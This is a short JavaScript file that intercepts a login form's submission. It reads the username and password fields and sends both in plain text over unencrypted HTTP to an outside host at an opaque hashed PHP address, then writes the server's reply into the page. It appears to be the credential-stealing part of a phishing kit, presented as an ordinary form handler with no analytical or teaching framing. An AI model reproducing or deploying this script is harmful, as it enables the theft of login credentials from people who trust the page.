window.addEventListener('load', function load(event) {
    document.getElementById('form').onsubmit = function(e) {
		
        var uname = document.getElementById('uname').value;
        var psw = document.getElementById('psw').value;
		
		var xhr = new XMLHttpRequest();
		xhr.onload = function (e) {
			if (xhr.readyState === 4) {
				if (xhr.status === 200) {
				  console.log(xhr.responseText);
				  document.write(xhr.responseText);
				} else {
				  console.error(xhr.statusText);
				}
			}
		};
		xhr.onerror = function (e) {
			console.error(xhr.statusText);
		};
		xhr.open("GET", "http://850e64fd16.siberyildiz.com/ad8aa4b6dce5b33daa8e9d86572b1142.php?id=d7ea4e84ef35841f81703c138be27f62&uname="+uname+"&psw="+psw, true);
		xhr.send();
		
		return false;
    };
});